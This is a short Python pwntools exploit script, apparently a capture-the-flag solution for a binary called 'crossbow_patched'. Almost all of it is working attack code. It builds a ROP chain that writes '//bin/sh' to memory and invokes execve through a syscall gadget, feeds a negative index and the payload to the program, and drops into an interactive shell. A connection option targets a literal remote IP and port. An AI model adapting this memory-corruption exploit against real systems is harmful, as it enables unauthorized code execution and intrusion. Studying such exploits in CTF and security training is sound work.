#!/usr/bin/env python3

from pwn import *
from struct import pack

p = lambda x : pack('Q', x)

IMAGE_BASE_0 = 0x0000000000400000 # 7bf5f772c59b6cc7854de1212fa8c99ec9bf25e33a4b0cd6c251200852dd2c2b
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = b''

rop += rebase_0(0x0000000000001001) # 0x0000000000401001: pop rax; ret;
rop += b'//bin/sh'
rop += rebase_0(0x0000000000001d6c) # 0x0000000000401d6c: pop rdi; ret;
rop += rebase_0(0x000000000000e000)
rop += rebase_0(0x00000000000020f5) # 0x00000000004020f5: mov qword ptr [rdi], rax; ret;
rop += rebase_0(0x0000000000001001) # 0x0000000000401001: pop rax; ret;
rop += p(0x0000000000000000)
rop += rebase_0(0x0000000000001d6c) # 0x0000000000401d6c: pop rdi; ret;
rop += rebase_0(0x000000000000e008)
rop += rebase_0(0x00000000000020f5) # 0x00000000004020f5: mov qword ptr [rdi], rax; ret;
rop += rebase_0(0x0000000000001d6c) # 0x0000000000401d6c: pop rdi; ret;
rop += rebase_0(0x000000000000e000)
rop += rebase_0(0x0000000000001001) # 0x0000000000401001: pop rax; ret;
rop += p(0x000000000000003b)
rop += rebase_0(0x0000000000004b51) # 0x0000000000404b51: syscall; ret;
print(rop)




e = ELF("crossbow_patched")

context.binary = e

def conn(cond):
    if cond == 1:
        r = process([e.path])
    elif cond == 2:
        r = gdb.debug([e.path], gdbscript="""
            b* target_dummy
            b* target_dummy+89
            b* target_dummy+430
            b* training+126
            c
            c
            """)
    elif cond == 3:
        r = remote("94.237.55.96", 58025)

    return r



def main():
    r = conn(2)
    print(hex(len(rop)))
    print(hex(e.bss()))
    r.sendline(b"-2")
    r.sendline(b"/bin/sh\x00" + rop)

    r.clean()
    r.interactive()

if __name__ == "__main__":
    main()